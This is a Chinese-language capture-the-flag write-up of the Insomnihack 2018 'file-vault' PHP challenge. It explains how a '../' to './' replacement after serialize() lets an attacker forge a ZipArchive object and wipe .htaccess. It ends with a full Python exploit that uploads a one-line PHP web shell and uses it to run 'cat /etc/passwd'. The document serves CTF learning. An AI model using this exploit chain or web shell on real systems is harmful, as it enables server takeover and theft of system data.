#### writeup 

[https://www.jianshu.com/p/972327151eff](https://www.jianshu.com/p/972327151eff)
[https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault](https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault)


题目的源码就不再解释了，题目的核心是为了造成任意的php的类伪造。导致任意类反序列化。

#### 0x1 任意对象伪造 

有问题的代码如下：

```php
function myserialize($a, $secret) {
    $b = str_replace("../","./", serialize($a)); 
    return $b.hash_hmac('sha256', $b, $secret); 
}
```

这里会将序列化之后的数据中的 `../` 替换为 `./`， 
如果我们的文件名中含有 `../` 经过替换，就会导致字符串长度不一致跟实际长度不一致，最后导致反序列失败。 

比如有这么一个序列化后的字符串

```php
a:2:{i:0;s:3:"../";i:1;s:5:"hello";}
```
替换之后就变成了

```php
a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
```

这就会导致反序列化之后，向后面吞掉一个字符。如果合理的控制 `../` 的个数，
向后面吞掉适当的字符数量，就必然存在可能反序列化成功的情况。

比如下面的测试代码：

```php
function myserialize($a) {
    $b = str_replace("../","./", serialize($a)); 
    return $b; 
}
$tmp = "";
for($i =0 ; $i<11;$i++){
    $tmp .= "../";
}
$a = array(
    0=>$tmp,
    1=>";i:1;s:1:\"1"
    );

$se = myserialize($a);
var_dump(unserialize($se));
```
可以看到利用向后面吞掉字符的技巧，就可以成功的伪造出我们想要的数据。 


#### 0x2 到底该伪造什么 

回到题目中，我们可以上传两个文件,拿到的cookie可能是：

```
a:2:{i:0;O:10:"UploadFile":2:{s:8:"fakename";s:5:"2.png";s:8:"realname";s:44:"3e9ddc78608fad8c0be6ec1847976e78b77e1404.png";}i:1;O:10:"UploadFile":2:{s:8:"fakename";s:7:"show2.c";s:8:"realname";s:42:"1c64b2c6998470bc208e487a1b688665b0d7a7df.c";}}390aefd071fc674f5207e3ac2afdf066397a232174dad7929e7b5874a9a1ae00
```

我们可以在第一个文件的 fakename 处注入 `../` ,在序列化之后，就会向后面覆盖字符，我们可以让他一直覆盖到第二个文件的fakename的位置，在第二个文件的 fakename 中注入我们需要构造的对象，然后反序列化之后，就会拿到我们想要伪造的对象了。 

但是需要构造什么对象呢？`UploadFile` 这个类里面啥可用的魔术方法都没有，伪造这个类的数据没有什么用处。

读一下代码，发现进行反序列化之后，进行函数调用的点只有一个：

```php
    case 'open':
        $files = myunserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']])){
            echo $files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname);
        }
        exit;
```

只有这里有函数调用，调用了open函数，因为伪造题目的类没有用，那就想能不能伪造含有open函数的php的内置类，干一些事情呢？
列出一下php的内置类：

```php
foreach (get_declared_classes() as $class) {
    foreach (get_class_methods($class) as $method) {
      if ($method == "open")
        echo "$class->$method\n";
    }
  }
```
找到系统中存在的4个类：

```
SQLite3->open
SessionHandler->open
XMLReader->open
ZipArchive->open
```

回到题目中，因为题目中的 .htaccess 存在，导致我们没法 getshell ，如果可以把这个文件删除了，就可以直接getshell。

看到 ZipArchive::open函数的文档:

[http://php.net/manual/en/ziparchive.open.php](http://php.net/manual/en/ziparchive.open.php)

flags 参数 ：

```
flags
The mode to use to open the archive.
ZipArchive::OVERWRITE
ZipArchive::CREATE
ZipArchive::EXCL
ZipArchive::CHECKCONS
```
当flags参数是 `ZipArchive::OVERWRITE |  ZipArchive::CREATE`  也就是 9 的时候，会覆盖一个旧的文件，并且内容是空，
可以利用这个来删除 .htaccess 文件的内容。

最后利用的exp是：

```python
#!/usr/bin/env python2

import requests
import urllib

URL = "http://your-ip:8088/"
s = requests.Session()

def upload(name, content="GARBAGE"):
    files = {'file': (name, content)}
    params = { "action" : "upload" }
    s.post(URL, params=params, files=files)
def rename(index, new_name):
    data = { "newname" : new_name }
    params = {
        "action" : "changename",
        "i" : index
    }
    s.post(URL, params=params, data=data)

def open_file(index):
    params = {
        "action" : "open",
        "i" : index
    }
    return s.get(URL, params=params).text

newname = "../" * 117 # To overwrite fakename #2
serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/fee5a18a21f9783a438428dfe0e0e2dbc4d33d2f/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'

# Upload 2 files
upload("A")
upload("B")

# Rename to inject serialized ZipArchiver
rename(1, serialized_injection)
rename(0, newname)

print " === Cookie === "
print urllib.unquote(s.cookies['files'])

# Upload a shell
upload("shell.php", "<?php system($_GET[cmd]); ?>")

# Cookie received

# Trigger .htaccess removal
open_file(1)

shell_url = URL + "sandbox/fee5a18a21f9783a438428dfe0e0e2dbc4d33d2f/fe95113d494997061044e7142af542e84f3eebbf.php"

response = requests.get(shell_url, params={"cmd" : "cat /etc/passwd"})
flag = response.text
print flag
```









